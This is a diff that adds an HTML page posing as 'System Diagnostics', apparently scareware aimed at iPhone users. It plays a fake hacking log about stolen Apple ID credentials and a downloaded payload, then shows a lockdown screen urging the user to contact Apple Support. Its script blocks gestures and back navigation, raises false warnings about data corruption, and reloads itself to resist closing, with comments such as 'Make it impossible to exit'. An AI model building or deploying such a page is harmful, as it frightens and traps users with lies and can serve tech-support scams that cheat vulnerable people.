@@ -1,0 +1,393 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>System Diagnostics</title>
+    <link rel="manifest" href="manifest.json">
+    <style>
+        * {
+            -webkit-touch-callout: none;
+            -webkit-user-select: none;
+            user-select: none;
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+            background-color: #000;
+            color: #fff;
+            height: 100vh;
+            width: 100vw;
+            overflow: hidden;
+            touch-action: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+        }
+        
+        .screen {
+            padding: 20px;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .header {
+            color: #ff3b30;
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 30px;
+            text-align: center;
+        }
+        
+        .log-container {
+            flex-grow: 1;
+            overflow-y: auto;
+            margin-bottom: 20px;
+        }
+        
+        .log-entry {
+            font-family: 'Courier New', Courier, monospace;
+            color: #4cd964;
+            margin-bottom: 8px;
+            font-size: 16px;
+            opacity: 0;
+            animation: fadeIn 0.5s forwards;
+        }
+        
+        @keyframes fadeIn {
+            to { opacity: 1; }
+        }
+        
+        .progress-container {
+            height: 4px;
+            background-color: #333;
+            border-radius: 2px;
+            margin-bottom: 30px;
+            overflow: hidden;
+        }
+        
+        .progress-bar {
+            height: 100%;
+            background-color: #ff3b30;
+            width: 0%;
+            transition: width 0.3s;
+        }
+        
+        .countdown {
+            text-align: center;
+            font-size: 24px;
+            color: #ff3b30;
+            margin-bottom: 20px;
+        }
+        
+        .popup {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.9);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 100;
+            padding: 20px;
+        }
+        
+        .popup-content {
+            background-color: #1c1c1e;
+            border-radius: 14px;
+            padding: 20px;
+            width: 100%;
+            max-width: 300px;
+            border: 1px solid #ff3b30;
+        }
+        
+        .popup-title {
+            color: #ff3b30;
+            font-size: 20px;
+            font-weight: bold;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+        
+        .popup-message {
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        
+        .popup-buttons {
+            display: flex;
+            gap: 10px;
+        }
+        
+        .popup-button {
+            flex: 1;
+            padding: 10px;
+            border-radius: 10px;
+            border: none;
+            font-weight: bold;
+        }
+        
+        .cancel-button {
+            background-color: #2c2c2e;
+            color: #fff;
+        }
+        
+        .confirm-button {
+            background-color: #ff3b30;
+            color: #fff;
+        }
+        
+        .emergency-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #ff3b30;
+            color: #fff;
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            text-align: center;
+            z-index: 200;
+        }
+    </style>
+</head>
+<body>
+    <div class="screen" id="mainScreen">
+        <div class="header">⚠️ SYSTEM OVERRIDE ⚠️</div>
+        <div class="log-container" id="logContainer"></div>
+        <div class="progress-container">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+        <div class="countdown" id="countdown">00:60</div>
+    </div>
+    
+    <div class="popup" id="exitPopup">
+        <div class="popup-content">
+            <div class="popup-title">Security Alert</div>
+            <div class="popup-message">Terminating this process may corrupt your system data. Continue?</div>
+            <div class="popup-buttons">
+                <button class="popup-button cancel-button" id="cancelExit">Cancel</button>
+                <button class="popup-button confirm-button" id="confirmExit">Exit</button>
+            </div>
+        </div>
+    </div>
+    
+    <div class="popup" id="warningPopup">
+        <div class="popup-content">
+            <div class="popup-title">Warning</div>
+            <div class="popup-message">Unauthorized access detected. System integrity compromised.</div>
+            <div class="popup-buttons">
+                <button class="popup-button confirm-button" id="acknowledgeWarning">Acknowledge</button>
+            </div>
+        </div>
+    </div>
+    
+    <div class="emergency-screen" id="emergencyScreen">
+        <h1>CRITICAL ERROR</h1>
+        <p>Your device has been locked for security reasons.</p>
+        <p>Please contact Apple Support immediately.</p>
+        <p>Error Code: IOS_SECURITY_BREACH_4472</p>
+    </div>
+
+    <script>
+        // PWA installation prompt
+        window.addEventListener('beforeinstallprompt', (e) => {
+            e.preventDefault();
+            // You could prompt user to install for more persistence
+        });
+        
+        // Configure app to run in standalone mode if installed
+        if (window.navigator.standalone) {
+            document.documentElement.style.backgroundColor = '#000';
+        }
+        
+        // Prevent all user interactions
+        document.addEventListener('touchmove', (e) => e.preventDefault(), { passive: false });
+        document.addEventListener('gesturestart', (e) => e.preventDefault());
+        document.addEventListener('contextmenu', (e) => e.preventDefault());
+        
+        // Make it impossible to exit
+        window.onbeforeunload = function(e) {
+            showPopup('exitPopup');
+            e.returnValue = "Terminating this process may corrupt your system data.";
+            return e.returnValue;
+        };
+        
+        // DOM elements
+        const logContainer = document.getElementById('logContainer');
+        const progressBar = document.getElementById('progressBar');
+        const countdown = document.getElementById('countdown');
+        const cancelExit = document.getElementById('cancelExit');
+        const confirmExit = document.getElementById('confirmExit');
+        const acknowledgeWarning = document.getElementById('acknowledgeWarning');
+        
+        // Fake system messages
+        const systemMessages = [
+            "Initializing system scan...",
+            "Checking security protocols...",
+            "Bypassing iOS restrictions...",
+            "Accessing secure enclave...",
+            "Establishing remote connection...",
+            "Downloading payload... (247.8MB)",
+            "Scanning device information...",
+            `Device identified: iPhone${Math.floor(Math.random() * 15) + 1}, iOS ${Math.floor(Math.random() * 5) + 15}.${Math.floor(Math.random() * 5)}`,
+            "Location tracking enabled...",
+            "Accessing contacts database...",
+            "Accessing photos library...",
+            "Compromising Apple ID credentials...",
+            "Installing persistence module...",
+            "Finalizing system override...",
+            "WARNING: SYSTEM INTEGRITY COMPROMISED",
+            "EMERGENCY LOCKDOWN INITIATED"
+        ];
+        
+        // Add a message to the log
+        function addLogMessage(message) {
+            const logEntry = document.createElement('div');
+            logEntry.className = 'log-entry';
+            logEntry.textContent = message;
+            logContainer.appendChild(logEntry);
+            logContainer.scrollTop = logContainer.scrollHeight;
+        }
+        
+        // Show a popup
+        function showPopup(id) {
+            document.getElementById(id).style.display = 'flex';
+        }
+        
+        // Hide a popup
+        function hidePopup(id) {
+            document.getElementById(id).style.display = 'none';
+        }
+        
+        // Show emergency screen
+        function showEmergencyScreen() {
+            document.getElementById('emergencyScreen').style.display = 'flex';
+            document.getElementById('mainScreen').style.display = 'none';
+            
+            // Make emergency screen unclosable
+            setTimeout(() => {
+                window.location.href = window.location.href;
+            }, 10000);
+        }
+        
+        // Start the fake system process
+        function startSystemOverride() {
+            let progress = 0;
+            let messageIndex = 0;
+            let seconds = 60;
+            
+            // Update progress bar
+            const progressInterval = setInterval(() => {
+                progress += Math.random() * 5;
+                if (progress > 100) progress = 100;
+                progressBar.style.width = `${progress}%`;
+                
+                if (progress >= 100) {
+                    clearInterval(progressInterval);
+                    showEmergencyScreen();
+                }
+            }, 800);
+            
+            // Add log messages
+            const messageInterval = setInterval(() => {
+                if (messageIndex < systemMessages.length) {
+                    addLogMessage(systemMessages[messageIndex]);
+                    messageIndex++;
+                } else {
+                    clearInterval(messageInterval);
+                }
+            }, 2000);
+            
+            // Update countdown
+            const countdownInterval = setInterval(() => {
+                seconds--;
+                const mins = Math.floor(seconds / 60);
+                const secs = seconds % 60;
+                countdown.textContent = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+                
+                if (seconds <= 0) {
+                    clearInterval(countdownInterval);
+                }
+            }, 1000);
+            
+            // Random popups
+            setInterval(() => {
+                if (Math.random() > 0.7 && !document.querySelector('.popup[style*="flex"]')) {
+                    showPopup('warningPopup');
+                }
+            }, 10000);
+        }
+        
+        // Event listeners for popup buttons
+        cancelExit.addEventListener('click', () => {
+            hidePopup('exitPopup');
+            // Show another popup shortly after
+            setTimeout(() => showPopup('warningPopup'), 1000);
+        });
+        
+        confirmExit.addEventListener('click', () => {
+            // Don't actually let them exit
+            showPopup('warningPopup');
+            hidePopup('exitPopup');
+        });
+        
+        acknowledgeWarning.addEventListener('click', () => {
+            hidePopup('warningPopup');
+        });
+        
+        // Start the process
+        setTimeout(startSystemOverride, 1000);
+        
+        // Prevent going back in history
+        history.pushState(null, null, location.href);
+        window.onpopstate = function() {
+            history.go(1);
+            showPopup('exitPopup');
+        };
+        
+        // Detect if user tries to switch apps (Page Visibility API)
+        document.addEventListener('visibilitychange', () => {
+            if (document.hidden) {
+                showPopup('warningPopup');
+            }
+        });
+    </script>
+    
+    <!-- Web App Manifest -->
+    <script type="application/manifest+json" id="manifest">
+        {
+            "name": "System Diagnostics",
+            "short_name": "SysDiag",
+            "start_url": ".",
+            "display": "standalone",
+            "background_color": "#000000",
+            "theme_color": "#000000",
+            "icons": [
+                {
+                    "src": "icon.png",
+                    "sizes": "192x192",
+                    "type": "image/png"
+                },
+                {
+                    "src": "icon-large.png",
+                    "sizes": "512x512",
+                    "type": "image/png"
+                }
+            ]
+        }
+    </script>
+</body>
+</html>
